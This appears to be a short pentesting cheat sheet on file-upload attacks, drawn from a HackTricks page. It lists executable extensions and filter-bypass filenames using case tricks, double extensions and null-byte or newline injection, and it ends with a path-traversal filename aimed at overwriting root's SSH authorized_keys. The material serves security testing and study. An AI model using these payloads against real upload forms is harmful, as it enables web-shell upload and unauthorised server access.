
https://book.hacktricks.xyz/pentesting-web/file-upload

#### ASPX or PHP
Find out if the back-end is running ASPX or PHP, 

There are ASPX and PHP reverse shells.
#### Bypassing filters
###### General extensions
```
PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
 - Working in PHPv8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp
ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
Coldfusion: .cfm, .cfml, .cfc, .dbm
Flash: .swf
Perl: .pl, .cgi
Erlang Yaws Web Server: .yaws
```

#### Extension filters
###### General filter types
| Filter | Bypasses |
| ---- | ---- |
| Case checking | `.pHp` |
| First extension checking | `.png.php` |
| Adding a special character | `.php%00`, `.php%0a` |
| Secondary filetypes | `.php5`, `.php2` |
###### Small list
```
file.php%20
file.php%0a
file.php%00
file.php%0d%0a
file.php/
file.php.\
file.
file.php....
file.pHp5....

file.png.php
file.png.pHp5
file.php#.png
file.php%00.png
file.php\x00.png
file.php%0a.png
file.php%0d%0a.png
file.phpJunk123png

file.png.jpg.php
file.php%00.png%00.jpg

file.php.png
```

### Non-executables
In `Burp Suite`, change the file to any known user
```
filename="../../../../../../../root/.ssh/authorized_keys"
```